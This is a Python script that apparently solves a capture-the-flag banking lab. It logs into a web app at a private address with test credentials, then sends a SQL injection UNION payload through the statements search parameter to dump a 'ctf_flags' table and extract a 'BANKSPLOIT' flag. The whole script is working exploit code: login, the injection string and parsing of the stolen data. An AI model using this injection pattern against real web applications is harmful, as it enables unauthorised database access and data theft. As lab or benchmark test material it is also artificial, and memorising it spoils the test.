#!/usr/bin/env python3
import urllib.request
import urllib.parse
import http.cookiejar

url_base = "http://10.141.199.78:9443"
cookie_jar = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cookie_jar))

try:
    # Login
    login_url = f"{url_base}/login"
    login_data = urllib.parse.urlencode({
        'email': 'alice@example.com',
        'password': 'password123'
    }).encode()
    req = urllib.request.Request(login_url, data=login_data, method='POST')
    opener.open(req, timeout=10)

    # Access statements to trigger seeding
    req = urllib.request.Request(f"{url_base}/statements")
    opener.open(req, timeout=10)

    # Simple UNION to get all from ctf_flags
    payload = "x' UNION SELECT user_id,vuln_key,flag,flag,flag,flag,flag FROM ctf_flags WHERE 1=1 #"
    url = f"{url_base}/statements?q={urllib.parse.quote(payload)}&account_id=1"
    req = urllib.request.Request(url)
    response = opener.open(req, timeout=10)
    html = response.read().decode('utf-8', errors='ignore')

    # Just check if BANKSPLOIT is in the response
    if 'BANKSPLOIT' in html:
        import re
        match = re.search(r'BANKSPLOIT\{[A-F0-9]{12}\}', html)
        if match:
            print(f"YES - {match.group(0)}")
        else:
            print("NO - BANKSPLOIT found but wrong format")
    else:
        # Try to see error message
        if 'Error' in html or 'error' in html:
            print("NO - SQL error in response")
        else:
            print("NO - BANKSPLOIT not in response")
            # Save for debugging
            with open('response.txt', 'w') as f:
                f.write(html[:2000])

except Exception as e:
    print(f"NO - {e}")
